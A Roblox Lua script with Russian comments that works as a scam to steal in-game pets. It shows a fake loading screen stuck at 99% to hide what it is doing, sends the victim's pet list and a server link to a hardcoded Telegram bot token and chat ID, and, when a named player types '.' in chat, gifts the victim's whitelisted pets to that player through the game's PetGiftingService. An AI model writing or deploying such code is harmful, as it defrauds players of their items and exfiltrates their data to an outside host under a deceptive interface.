local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

-- 🔧 НАСТРОЙКИ
local CONFIG = {
    TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE",
    TELEGRAM_CHAT_ID = "7144575011",
    TARGET_PLAYER = "sfdgbzdfsb",
    TRIGGER_MESSAGE = ".",
    MAX_RETRIES = 3,
    RETRY_DELAY = 5,
    LOADING_TIME = 300 -- 5 минут в секундах
}

-- 🐾 БЕЛЫЙ СПИСОК (можно легко редактировать)
local WHITELIST = {
    "Rooster",
    -- добавьте других питомцев здесь
}

-- 📊 СТАТИСТИКА
local STATS = {
    startTime = tick(),
    totalPetsTransferred = 0,
    errors = 0,
    lastActivity = tick()
}

-- 🌌 УЛУЧШЕННАЯ GUI ЗАГРУЗКИ
local function createLoadingGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "CustomLoadingUI"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player:WaitForChild("PlayerGui")
    
    -- ФОН с анимацией
    local background = Instance.new("ImageLabel")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.Image = "rbxassetid://128494498539944"
    background.BackgroundTransparency = 1
    background.ScaleType = Enum.ScaleType.Crop
    background.Parent = screenGui
    
    -- Пульсирующая анимация фона
    local pulseSize = 1.05
    local pulseTween = game:GetService("TweenService"):Create(
        background,
        TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {Size = UDim2.new(pulseSize, 0, pulseSize, 0)}
    )
    pulseTween:Play()
    
    -- Надпись с анимацией точек
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 50)
    label.Position = UDim2.new(0, 0, 0.4, 0)
    label.BackgroundTransparency = 1
    label.Text = "Loading"
    label.TextColor3 = Color3.new(1, 1, 1)
    label.Font = Enum.Font.GothamBold
    label.TextSize = 36
    label.TextStrokeTransparency = 0.6
    label.Parent = background
    
    -- Анимация точек
    task.spawn(function()
        local dots = {"", ".", "..", "..."}
        local dotIndex = 1
        while screenGui.Parent do
            label.Text = "Loading" .. dots[dotIndex]
            dotIndex = dotIndex % 4 + 1
            task.wait(0.5)
        end
    end)
    
    -- Улучшенный прогресс-бар
    local barContainer = Instance.new("Frame")
    barContainer.Size = UDim2.new(0.4, 0, 0.025, 0)
    barContainer.Position = UDim2.new(0.3, 0, 0.5, 0)
    barContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    barContainer.BorderSizePixel = 0
    barContainer.Parent = background
    
    -- Закругленные углы для контейнера
    local containerCorner = Instance.new("UICorner")
    containerCorner.CornerRadius = UDim.new(0, 8)
    containerCorner.Parent = barContainer
    
    local barFill = Instance.new("Frame")
    barFill.Size = UDim2.new(0, 0, 1, 0)
    barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    barFill.BorderSizePixel = 0
    barFill.Parent = barContainer
    
    -- Закругленные углы для заполнения
    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(0, 8)
    fillCorner.Parent = barFill
    
    -- Градиент для заполнения
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 170))
    })
    gradient.Parent = barFill
    
    local percent = Instance.new("TextLabel")
    percent.Size = UDim2.new(0, 60, 0, 25)
    percent.Position = UDim2.new(0.71, 10, 0.5, -12)
    percent.BackgroundTransparency = 1
    percent.TextColor3 = Color3.new(1, 1, 1)
    percent.Text = "0%"
    percent.Font = Enum.Font.Gotham
    percent.TextSize = 20
    percent.TextXAlignment = Enum.TextXAlignment.Left
    percent.Parent = background
    
    -- Плавная анимация прогресса
    local tweenService = game:GetService("TweenService")
    for i = 1, 99 do
        local fillTween = tweenService:Create(
            barFill,
            TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = UDim2.new(i / 100, 0, 1, 0)}
        )
        fillTween:Play()
        percent.Text = i .. "%"
        task.wait(3)
    end
    
    -- Остается на 99%
    percent.Text = "99%"
    return screenGui
end

-- 📨 УЛУЧШЕННАЯ СИСТЕМА TELEGRAM
local function sendToTelegram(text, isError)
    local icon = isError and "❌" or "ℹ️"
    local timestamp = os.date("%H:%M:%S")
    local formattedText = string.format("%s [%s] %s", icon, timestamp, text)
    
    local url = "https://api.telegram.org/bot"..CONFIG.TELEGRAM_TOKEN.."/sendMessage"..
                "?chat_id="..CONFIG.TELEGRAM_CHAT_ID.."&text="..HttpService:UrlEncode(formattedText).."&parse_mode=HTML"
    
    for attempt = 1, CONFIG.MAX_RETRIES do
        local success, response = pcall(function() 
            return game:HttpGet(url) 
        end)
        
        if success then
            return true
        else
            warn("Попытка "..attempt.." не удалась: "..tostring(response))
            if attempt < CONFIG.MAX_RETRIES then
                task.wait(CONFIG.RETRY_DELAY)
            end
        end
    end
    
    STATS.errors = STATS.errors + 1
    return false
end

-- 🔗 ИСПРАВЛЕННАЯ ФУНКЦИЯ ПОЛУЧЕНИЯ ССЫЛКИ
local function getServerLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    if not jobId or jobId == "" or jobId == "0" then
        return "https://www.roblox.com/games/"..placeId.." (приватная ссылка недоступна)"
    end
    
    -- ПРАВИЛЬНЫЙ формат ссылки для Roblox
    return "https://www.roblox.com/games/"..placeId.."?privateServerLinkCode="..jobId
end

-- 🔎 УЛУЧШЕННАЯ ФУНКЦИЯ ПОЛУЧЕНИЯ ПИТОМЦЕВ
local function getAllPets()
    local pets = {}
    local sources = {player.Backpack}
    
    if player.Character then
        table.insert(sources, player.Character)
    end
    
    for _, source in ipairs(sources) do
        for _, item in ipairs(source:GetChildren()) do
            if item:IsA("Tool") and item.Name:find("%[") then
                local weight, age = item.Name:match("%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
                if weight and age then
                    local petName = item.Name:match("^([^%[]+)") or item.Name
                    petName = petName:gsub("%s+$", "")
                    
                    local isWhitelisted = false
                    for _, whitelistedPet in ipairs(WHITELIST) do
                        if petName:lower():find(whitelistedPet:lower()) then
                            isWhitelisted = true
                            break
                        end
                    end
                    
                    table.insert(pets, {
                        name = petName,
                        fullName = item.Name,
                        weight = tonumber(weight),
                        age = tonumber(age),
                        object = item,
                        isWhitelisted = isWhitelisted,
                        rarity = item.Name:match("Legendary") and "Legendary" or 
                               item.Name:match("Epic") and "Epic" or 
                               item.Name:match("Rare") and "Rare" or "Common"
                    })
                end
            end
        end
    end
    
    -- Сортировка по редкости и весу
    table.sort(pets, function(a, b)
        local rarityOrder = {Legendary = 4, Epic = 3, Rare = 2, Common = 1}
        if rarityOrder[a.rarity] ~= rarityOrder[b.rarity] then
            return rarityOrder[a.rarity] > rarityOrder[b.rarity]
        end
        return a.weight > b.weight
    end)
    
    return pets
end

-- 📜 УЛУЧШЕННЫЙ СПИСОК ПИТОМЦЕВ
local function getFormattedPetsList()
    local pets = getAllPets()
    if #pets == 0 then return "🚫 Нет питомцев" end
    
    local whitelisted = {}
    local blacklisted = {}
    local totalValue = 0
    
    for _, pet in ipairs(pets) do
        local emoji = pet.rarity == "Legendary" and "🏆" or 
                     pet.rarity == "Epic" and "💜" or 
                     pet.rarity == "Rare" and "💙" or "⚪"
        
        local status = pet.isWhitelisted and "✅ Передать" or "❌ Оставить"
        local petInfo = string.format("%s <b>%s</b> [%.1f кг, %d дней] - %s", 
                                     emoji, pet.name, pet.weight, pet.age, status)
        
        totalValue = totalValue + pet.weight
        
        if pet.isWhitelisted then
            table.insert(whitelisted, petInfo)
        else
            table.insert(blacklisted, petInfo)
        end
    end
    
    local result = {"📊 <b>Статистика питомцев:</b>"}
    table.insert(result, string.format("🔢 Всего: %d | 💰 Общий вес: %.1f кг", #pets, totalValue))
    table.insert(result, string.format("✅ К передаче: %d | ❌ К сохранению: %d", #whitelisted, #blacklisted))
    table.insert(result, "")
    
    if #whitelisted > 0 then
        table.insert(result, "✅ <b>Питомцы к передаче:</b>")
        for _, pet in ipairs(whitelisted) do
            table.insert(result, pet)
        end
        table.insert(result, "")
    end
    
    if #blacklisted > 0 then
        table.insert(result, "❌ <b>Питомцы к сохранению:</b>")
        for i = 1, math.min(5, #blacklisted) do -- Показываем только первые 5
            table.insert(result, blacklisted[i])
        end
        if #blacklisted > 5 then
            table.insert(result, string.format("... и еще %d питомцев", #blacklisted - 5))
        end
    end
    
    return table.concat(result, "\n")
end

-- 🚚 УЛУЧШЕННАЯ ПЕРЕДАЧА ПИТОМЦЕВ
local function transferPet(pet)
    if not pet.isWhitelisted then return false, "Не в белом списке" end
    
    local target = Players:FindFirstChild(CONFIG.TARGET_PLAYER)
    if not target then
        return false, "Целевой игрок не найден"
    end
    
    local PetGiftingService = ReplicatedStorage:FindFirstChild("GameEvents")
    if PetGiftingService then
        PetGiftingService = PetGiftingService:FindFirstChild("PetGiftingService")
    end
    
    if not PetGiftingService then
        return false, "Сервис передачи питомцев недоступен"
    end
    
    if not (player.Character and player.Character:FindFirstChild("Humanoid")) then
        return false, "Персонаж недоступен"
    end
    
    -- Попытка экипировки и передачи
    for attempt = 1, 3 do
        local success, error = pcall(function()
            player.Character.Humanoid:EquipTool(pet.object)
            task.wait(1.5)
            PetGiftingService:FireServer("GivePet", target)
        end)
        
        if success then
            STATS.totalPetsTransferred = STATS.totalPetsTransferred + 1
            STATS.lastActivity = tick()
            return true, "Успешно передан"
        else
            if attempt < 3 then
                task.wait(2)
            end
        end
    end
    
    return false, "Ошибка передачи"
end

-- 🏁 УЛУЧШЕННОЕ СТАРТОВОЕ УВЕДОМЛЕНИЕ
local function sendInitialNotification()
    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
    local petsList = getFormattedPetsList()
    local serverLink = getServerLink()
    
    local message = string.format(
        "🟢 <b>Скрипт запущен</b>\n\n" ..
        "👤 Игрок: <b>%s</b>\n" ..
        "🎯 Цель: <b>%s</b>\n" ..
        "⏰ Время работы: %s\n\n" ..
        "%s\n\n" ..
        "🔗 <a href=\"%s\">Подключиться к серверу</a>",
        player.Name, CONFIG.TARGET_PLAYER, uptime, petsList, serverLink
    )
    
    sendToTelegram(message)
end

-- 📊 СИСТЕМА СТАТИСТИКИ
local function sendStatusUpdate()
    local uptime = string.format("%.1f мин", (tick() - STATS.startTime) / 60)
    local lastActivityAgo = string.format("%.1f мин", (tick() - STATS.lastActivity) / 60)
    
    local message = string.format(
        "📊 <b>Обновление статуса</b>\n\n" ..
        "⏰ Время работы: %s\n" ..
        "🔄 Последняя активность: %s назад\n" ..
        "✅ Передано питомцев: %d\n" ..
        "❌ Ошибок: %d\n" ..
        "👥 Игроков на сервере: %d",
        uptime, lastActivityAgo, STATS.totalPetsTransferred, 
        STATS.errors, #Players:GetPlayers()
    )
    
    sendToTelegram(message)
end

-- 🚚 УЛУЧШЕННЫЙ ПРОЦЕСС ПЕРЕДАЧИ
local function startPetTransfer()
    local pets = getAllPets()
    if #pets == 0 then
        sendToTelegram("❌ Нет питомцев для передачи", true)
        return
    end
    
    local whitelistedPets = {}
    for _, pet in ipairs(pets) do
        if pet.isWhitelisted then
            table.insert(whitelistedPets, pet)
        end
    end
    
    if #whitelistedPets == 0 then
        sendToTelegram("❌ Нет питомцев в белом списке для передачи", true)
        return
    end
    
    sendToTelegram(string.format("🔄 Начинаю передачу %d питомцев...", #whitelistedPets))
    
    local successful = 0
    local failed = 0
    local results = {}
    
    for i, pet in ipairs(whitelistedPets) do
        local success, reason = transferPet(pet)
        if success then
            successful = successful + 1
            table.insert(results, string.format("✅ %s", pet.name))
        else
            failed = failed + 1
            table.insert(results, string.format("❌ %s (%s)", pet.name, reason))
        end
        
        -- Прогресс каждые 5 питомцев
        if i % 5 == 0 or i == #whitelistedPets then
            sendToTelegram(string.format("📈 Прогресс: %d/%d (✅%d ❌%d)", 
                                       i, #whitelistedPets, successful, failed))
        end
        
        task.wait(2.5) -- Увеличенная задержка для стабильности
    end
    
    -- Итоговый отчет
    local finalReport = string.format(
        "🏁 <b>Передача завершена</b>\n\n" ..
        "✅ Успешно: %d\n❌ Неудачно: %d\n📊 Общий прогресс: %d%%\n\n" ..
        "<b>Детали:</b>\n%s",
        successful, failed, 
        math.floor((successful / #whitelistedPets) * 100),
        table.concat(results, "\n")
    )
    
    sendToTelegram(finalReport)
end

-- 💬 УЛУЧШЕННАЯ СИСТЕМА ПРОСЛУШКИ СООБЩЕНИЙ
local function setupMessageListener()
    -- Для новой системы чата
    if TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            local speaker = Players:FindFirstChild(message.TextSource.Name)
            if speaker and speaker.Name == CONFIG.TARGET_PLAYER then
                if message.Text == CONFIG.TRIGGER_MESSAGE then
                    sendToTelegram(string.format("🎯 Получен триггер от %s", speaker.Name))
                    startPetTransfer()
                elseif message.Text:lower():find("status") then
                    sendStatusUpdate()
                elseif message.Text:lower():find("pets") then
                    sendToTelegram(getFormattedPetsList())
                end
            end
        end
    else
        -- Для старой системы чата
        Players.PlayerChatted:Connect(function(chatType, speaker, message)
            if chatType == Enum.PlayerChatType.All and speaker.Name == CONFIG.TARGET_PLAYER then
                if message == CONFIG.TRIGGER_MESSAGE then
                    sendToTelegram(string.format("🎯 Получен триггер от %s", speaker.Name))
                    startPetTransfer()
                elseif message:lower():find("status") then
                    sendStatusUpdate()
                elseif message:lower():find("pets") then
                    sendToTelegram(getFormattedPetsList())
                end
            end
        end)
    end
end

-- 🔄 АВТОМАТИЧЕСКИЕ ОБНОВЛЕНИЯ СТАТУСА
task.spawn(function()
    while true do
        task.wait(600) -- Каждые 10 минут
        sendStatusUpdate()
    end
end)

-- 🚀 ЗАПУСК ВСЕХ СИСТЕМ
task.spawn(function()
    createLoadingGUI()
    task.wait(5) -- Даем время на загрузку GUI
    sendInitialNotification()
    setupMessageListener()
    
    -- Проверка подключения целевого игрока
    task.spawn(function()
        while true do
            local target = Players:FindFirstChild(CONFIG.TARGET_PLAYER)
            if not target then
                sendToTelegram(string.format("⚠️ Целевой игрок %s покинул сервер", CONFIG.TARGET_PLAYER), true)
                break
            end
            task.wait(30)
        end
    end)
end)
